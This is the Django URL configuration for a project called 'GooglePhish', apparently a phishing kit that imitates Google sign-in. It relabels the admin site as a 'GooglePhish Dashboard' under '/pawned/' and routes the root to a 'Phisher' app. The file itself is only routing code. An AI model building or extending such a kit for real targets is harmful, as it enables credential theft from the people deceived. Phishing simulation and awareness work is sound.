"""GooglePhish URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/3.2/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from . import settings
from django.contrib import admin
from django.urls import path
from django.urls.conf import include, include
from django.conf.urls.static import static


# Change Admin Page default values
admin.site.site_url = '/pawned'
admin.site.site_header = 'GooglePhish Dashboard'
admin.site.site_title = 'GooglePhish Login'


urlpatterns = [
    path('pawned/', admin.site.urls),
    path('', include('Phisher.urls'))
] 

if settings.DEBUG:
    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
